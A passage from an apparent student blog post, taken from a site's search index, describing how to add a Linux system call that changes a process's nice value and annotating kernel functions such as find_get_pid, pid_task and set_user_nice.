return EFAULT; } return 0;} There seems to be a lot of questions though…. Didn’t think about the range of nice values when I first wrote it (didn’t even know nice values had a range). It’s an error way that somehow goes wrongAt first, I wanted to follow a tutorial on the Internet and try to write a method with parameters, similar to the one I wrote in the last blog about adding system calls. Create lab1_v2 folder in the root of the source code and add lab1_v2.c and Makefile Modify the Makefile file in the root directory of the source code Complete the regular three-step include/linux/syscalls.h, arch/x86/entry/syscalls/syscall_32.tbl and arch/x86/entry/syscalls/syscall_64.tbl Then compile the kernel make -j8 bzImage Written a demo as usual Then an error occurs when running Probably something went wrong when passing parameters? Related Source Codefind_get_pid(int nr) 123456789101112131415161718192021222324252627282930313233343536373839struct pid{ atomic_t count; //Number of tasks currently using this process unsigned int level; struct hlist_head tasks[PIDTYPE_MAX]； //List of tasks that use this process struct rcu_head rcu; struct upid numbers[1];};struct upid{ int nr; struct pid_namespace *ns; struct hlist_node pid_chain;};//find_get_pid(pid_t nr) is to get the process descriptor by the process number pid_t nr and add 1 to the count in the structurestruct pid *find_get_pid(pid_t nr) { struct pid *pid; rcu_read_lock(); pid = get_pid(find_vpid(nr)); rcu_read_unlock(); return pid; } //其中，find_vpid(pid_t nr) returns the process descriptor, and get_pid(struct pid * kpid) adds 1 to countstatic inline struct pid *get_pid(struct pid *pid){ if (pid) atomic_inc(&amp;pid-&gt;count); return pid;}struct pid *find_vpid(int nr){ return find_pid_ns(nr, task_active_pid_ns(current));} pid_task() 12345678910111213//Find pid_task by process descriptorstruct task_struct *pid_task(struct pid *pid, enum pid_type type){ struct task_struct *result = NULL; if (pid) { struct hlist_node *first; first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]), lockdep_tasklist_lock_is_held()); if (first) result = hlist_entry(first, struct task_struct, pids[(type)].node); } return result;} asmlinkageInform the compiler to extract the function parameters from the stack only, not from the registers, because the system has already pressed the parameter values passed through the registers into the kernel stack before executing the service routine set_user_nice() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364void set_user_nice(struct task_struct *p, long nice){ bool queued, running; int old_prio, delta; struct rq_flags rf; struct rq *rq; // rq is the ready queue, which is designed to be one ready queue per cpu, with local processes sorted on the local queue // If the current task's nice value is already equal to the nice value to be set, just exit // From here we can see that the nice values range from -20 to 19 if (task_nice(p) == nice || nice &lt; MIN_NICE || nice &gt; MAX_NICE) return; /* * We have to be careful, if called from sys_setpriority(), * the task might be in the middle of scheduling on another CPU. */ rq = task_rq_lock(p, &amp;rf); update_rq_clock(rq); /* * The RT priorities are set via sched_setscheduler(), but we still * allow the 'normal' nice value to be set - but as expected * it wont have any effect on scheduling until the task is * SCHED_DEADLINE, SCHED_FIFO or SCHED_RR: */ // If the current process is a real-time process, // the scheduling strategy for real-time processes can also be divided into deadline/fifo/rr. // Setting the nice value for real-time processes is actually useless, // but here it is still set to p-&gt;static_prio after converting the nice value to priority if (task_has_dl_policy(p) || task_has_rt_policy(p)) { p-&gt;static_prio = NICE_TO_PRIO(nice);// Change priority by edit nice value goto out_unlock; } queued = task_on_rq_queued(p); running = task_current(rq, p); if (queued) dequeue_task(rq, p, DEQUEUE_SAVE | DEQUEUE_NOCLOCK); if (running) put_prev_task(rq, p); // Set the nice value to priority in static_prio, #define NICE_TO_PRIO(nice) ((nice) + DEFAULT_PRIO) // The DEFAULT_PRIO value here is calculated to be 120. // From here you can also see that the priority-to-nice value should be subtracted from DEFAULT_PRIO // #define PRIO_TO_NICE(prio) ((prio) - DEFAULT_PRIO) p-&gt;static_prio = NICE_TO_PRIO(nice); set_load_weight(p); old_prio = p-&gt;prio; p-&gt;prio = effective_prio(p); delta = p-&gt;prio - old_prio; // If the task of the nice to be set is in the queue if (queued) { enqueue_task(rq, p, ENQUEUE_RESTORE | ENQUEUE_NOCLOCK); /* * If the task increased its priority or is running and * lowered its priority, then reschedule its CPU: */ // Reschedule rq if priority is increased and task is running or if priority is decreased. if (delta &lt; 0 || (delta &gt; 0 &amp;&amp; task_running(rq, p))) resched_curr(rq); } // If the task to set the nice value is running, and since we are changing the priority of p here, reassign the task's rq. if (running) set_curr_task(rq, p); out_unlock: task_rq_unlock(rq, p, &amp;rf);}","link":"/2022/03/09/backup-Syscalls-and-problems-encountered/"}],"tags":[],"categories":[],"pages":[]}